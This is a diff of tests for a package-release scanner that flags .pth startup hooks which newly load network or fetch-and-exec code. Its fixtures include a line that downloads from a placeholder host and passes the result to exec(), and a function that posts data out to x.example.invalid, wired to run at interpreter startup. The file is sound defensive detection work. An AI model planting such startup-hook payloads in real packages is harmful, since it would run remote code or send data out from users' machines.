@@ -14,6 +14,7 @@ from hunter.fake_jev import KeywordJev, RaisingJev
 from hunter.features import (
     build_config_changes,
     extract_features,
+    module_gained_indicators,
     outside_package_files,
     payload_indicators,
     pth_imported_modules,
@@ -433,8 +434,8 @@ FETCH_EXEC = "from urllib.request import urlopen\nexec(urlopen('https://x.exampl
     [
         # New top-level module with nothing that decodes, runs, or fetches.
         {"wheel/widget_hook.pth": "import widget_boot\n", "wheel/widget_boot.py": "X = 1\n"},
-        # The fetch is in a new module inside the package folder, not next to it.
-        {"wheel/widget_hook.pth": "import widget._net\n", "wheel/widget/_net.py": FETCH_EXEC},
+        # A new hook into the existing package, whose code did not change.
+        {"wheel/widget_hook.pth": "import widget._hook\n"},
         # The module the hook loads is not in this release.
         {"wheel/widget_hook.pth": "import widget_missing\n", "wheel/widget_other.py": FETCH_EXEC},
         # sitecustomize.py inside the package folder does not run at startup.
@@ -457,6 +458,54 @@ def test_the_strong_rule_needs_the_hook_and_the_module_to_be_new():
     assert _payload_hits(old, new) == ["wheel/sitecustomize.py"]
     old, new = _widget_wheels({"wheel/sitecustomize.py": "import os\n"}, {"wheel/sitecustomize.py": "import os\n" + FETCH_EXEC})
     assert _payload_hits(old, new) == []
+
+
+NETWORK_ONLY = "import urllib.request\ndef _send(body):\n    urllib.request.urlopen('https://x.example.invalid/t', data=body)\n"
+
+
+def test_a_new_pth_into_an_existing_package_that_gains_network_code_hits(monkeypatch):
+    monkeypatch.setenv("HUNTER_RULES", "on")
+    # Same shape as a hook that imports the package, whose __init__ now starts a new submodule.
+    extra = {
+        "wheel/widget_meta.pth": "import widget\n",
+        "wheel/widget/__init__.py": "VERSION = '1.1'\nfrom . import _diag\n_diag._send(b'')\n",
+        "wheel/widget/_diag.py": NETWORK_ONLY,
+    }
+    old, new = _widget_wheels({}, extra)
+    report = scan_release(old, new, ecosystem="pypi")
+    hit = next(hit for hit in report.hits if hit.rule == "startup_hook_payload")
+    assert hit.path == "wheel/widget_meta.pth"
+    assert hit.tier == "strong"
+    assert "wheel/widget/_diag.py: network (new in existing module)" in hit.matched
+    assert report.strong_floors["startup_hook_payload"] == "review"
+    # Importing the new submodule directly counts the same way.
+    old, new = _widget_wheels({}, {"wheel/widget_hook.pth": "import widget._net\n", "wheel/widget/_net.py": FETCH_EXEC})
+    assert _payload_hits(old, new) == ["wheel/widget_hook.pth"]
+
+
+def test_existing_module_hook_needs_a_new_line_and_new_payload_code():
+    # The old release already had network code in the module: nothing gained.
+    old, new = _widget_wheels(
+        {"wheel/widget/_net.py": NETWORK_ONLY},
+        {"wheel/widget_meta.pth": "import widget\n", "wheel/widget/_net.py": NETWORK_ONLY + "X = 1\n"},
+    )
+    assert _payload_hits(old, new) == []
+    # The .pth line was already shipped; only the module gained network code.
+    hook = {"wheel/widget_meta.pth": "import widget\n"}
+    old, new = _widget_wheels(hook, {**hook, "wheel/widget/_diag.py": NETWORK_ONLY})
+    assert _payload_hits(old, new) == []
+    # The module gained network code, but no hook loads it at startup.
+    old, new = _widget_wheels({}, {"wheel/widget/_diag.py": NETWORK_ONLY})
+    assert _payload_hits(old, new) == []
+
+
+def test_module_gained_indicators_compares_the_whole_module():
+    old = {"wheel/widget/__init__.py": "X = 1\n", "wheel/widget/a.py": NETWORK_ONLY}
+    moved = {"wheel/widget/__init__.py": "X = 1\n", "wheel/widget/b.py": NETWORK_ONLY}
+    assert module_gained_indicators(old, moved, "widget") == []
+    grown = {**old, "wheel/widget/c.py": COOK_PY}
+    assert module_gained_indicators(old, grown, "widget") == [("wheel/widget/c.py", ["decode_exec"])]
+    assert module_gained_indicators(old, grown, "missing") == []
 
 
 def test_pth_import_parsing_and_payload_indicators():
